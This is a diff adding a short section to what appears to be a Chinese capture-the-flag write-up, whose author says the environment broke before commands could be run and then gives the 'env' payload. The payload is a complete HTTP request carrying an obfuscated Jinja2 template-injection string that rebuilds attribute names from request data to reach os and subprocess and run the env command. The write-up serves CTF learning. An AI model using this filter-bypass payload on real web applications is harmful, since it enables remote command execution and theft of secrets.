@@ -312,3 +312,16 @@ print(r"Follow-your-heart-%23}"+output)
 
 
 ```
+最后突然环境炸了反正应该执行系统命令了，就不搞了，这是env的payload：
+```http
+GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%for%0ai%0ain%0arequest.endpoint|slice(1)%}{%set%0adat=i.9~i.2~i.12~i.2%}{%for%0ak%0ain%0arequest|attr(dat)|string|slice(1)%0a%}{%set%0aa0%0a=%0ak.16~k.31~k.31~k.27~k.24~k.18~k.16~k.35~k.24~k.30~k.29%}{%set%0aa1%0a=%0ak.2~k.2~k.22~k.27~k.30~k.17~k.16~k.27~k.34~k.2~k.2%}{%set%0aa2%0a=%0ak.2~k.2~k.22~k.20~k.35~k.24~k.35~k.20~k.28~k.2~k.2%}{%set%0aa3%0a=%0ak.2~k.2~k.17~k.36~k.24~k.27~k.35~k.24~k.29~k.34~k.2~k.2%}{%set%0aa4%0a=%0ak.2~k.2~k.24~k.28~k.31~k.30~k.33~k.35~k.2~k.2%}{%set%0aa5%0a=%0ak.34~k.36~k.17~k.31~k.33~k.30~k.18~k.20~k.34~k.34%}{%set%0aa6%0a=%0ak.30~k.34%}{%set%0aa7%0a=%0ak.24~k.28~k.31~k.30~k.33~k.35~k.27~k.24~k.17%}{%set%0aa8%0a=%0ak.33~k.20~k.27~k.30~k.16~k.19%}{%set%0aa9%0a=%0ak.31~k.30~k.31~k.20~k.29%}{%set%0aa10%0a=%0ak.20~k.29~k.37%}{%set%0aa11%0a=%0ak.33~k.20~k.16~k.19%}{%set%0asub=request|attr(a0)|attr(a1)|attr(a2)(a3)|attr(a2)(a4)(a5)%}{%set%0aso=request|attr(a0)|attr(a1)|attr(a2)(a3)|attr(a2)(a4)(a6)%}{%print(request|attr(a0)|attr(a1)|attr(a2)(a3)|attr(a2)(a4)(a7)|attr(a8)(sub))%}{%print(request|attr(a0)|attr(a1)|attr(a2)(a3)|attr(a2)(a4)(a7)|attr(a8)(so))%}{%print(so|attr(a9)(a10)|attr(a11)())%}{%endfor%}{%endfor%} HTTP/1.1
+Host: challenge.imxbt.cn:30680/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+_ .-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/
+
+```
